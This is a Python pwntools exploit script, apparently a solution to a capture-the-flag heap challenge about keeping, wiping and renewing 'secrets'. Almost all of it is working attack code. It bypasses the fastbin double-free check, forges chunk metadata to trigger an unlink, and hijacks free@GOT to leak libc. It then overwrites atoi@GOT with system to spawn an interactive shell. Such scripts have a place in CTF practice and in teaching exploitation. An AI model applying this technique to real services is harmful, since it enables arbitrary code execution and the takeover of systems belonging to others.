#!/usr/bin/env python

from pwn import *

r = remote('127.0.0.1', 4000)
#r = remote('52.68.31.117', 9547)

secret_kind = {'small':'1', 'big':'2', 'huge':'3'}


#libc = ELF('libc.so.6')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
atoi_got = 0x602080
free_got = 0x602018
puts_plt = 0x400766

def keep(size, content):
    r.recvuntil('3. Renew secret\n')
    r.sendline('1')
    r.recvuntil('2. Big secret\n')
    r.sendline(secret_kind[size])
    r.recvuntil('Tell me your secret:')
    r.sendline(content)

def wipe(size):
    r.recvuntil('3. Renew secret\n')
    r.sendline('2')
    r.recvuntil('2. Big secret\n')
    r.sendline(secret_kind[size])

def renew(size, content):
    r.recvuntil('3. Renew secret\n')
    r.sendline('3')
    r.recvuntil('2. Big secret\n')
    r.sendline(secret_kind[size])
    r.recvuntil('Tell me your secret:')
    r.sendline(content)


keep('small', 'AAAA')
keep('big', 'BBBB') # keep big to prevent the small chunk to consolidate with top chunk
wipe('small')

# malloc secret: malloc big enough size, it will get fastbin chunk back, so it(previous small chunk) will be move into smallbin
keep('huge', 'CCCC')

# now we can free small chunk again, since it has been moved into smallbin, it will pass the check of double free
# bypass double free, then we can put this chunk back to fastbin again
# so that we won't let big chunk's previous in use bit to be set up
wipe('small') 


fake_fd = 0x6020d0-0x18
fake_bk = 0x6020d0-0x10
payload = ""
payload += p64(0x0) + p64(0x21) # fake previous size and size
payload += p64(fake_fd) + p64(fake_bk) # fake fb and bk to unlink
payload += p64(0x20) # fake previous size 
keep('small', payload)

wipe('big') # to trigger unlink

raw_input('#')

payload = ""
payload += p64(0x0) # padding
payload += p64(free_got) # big_buf
payload += p64(0x0)
payload += p64(0x6020c0) # for write arbitrary
payload += p32(1)*3 # let us be easy to renew
renew('small', payload)

renew('big', p64(puts_plt)*2) # hijack free to call puts, *2 to prevent origin puts broke

payload = ""
payload += p64(atoi_got)
payload += p64(0x0)
payload += p64(0x6020c0) # address of big_buf
payload += p32(1)*3
renew('small', payload)

wipe('big')

x = r.recvline()
base = u64(x[:6].ljust(8,'\x00')) - libc.symbols['atoi']
print hex(base)

system = base + libc.symbols['system']

payload = ""
payload += p64(atoi_got)
payload += p64(0x0)
payload += p64(0x6020c0)
payload += p32(1)*3
renew('small',payload)

renew('big', p64(system)) # GOT hijack

r.recv()
r.sendline('sh\x00')

r.interactive()
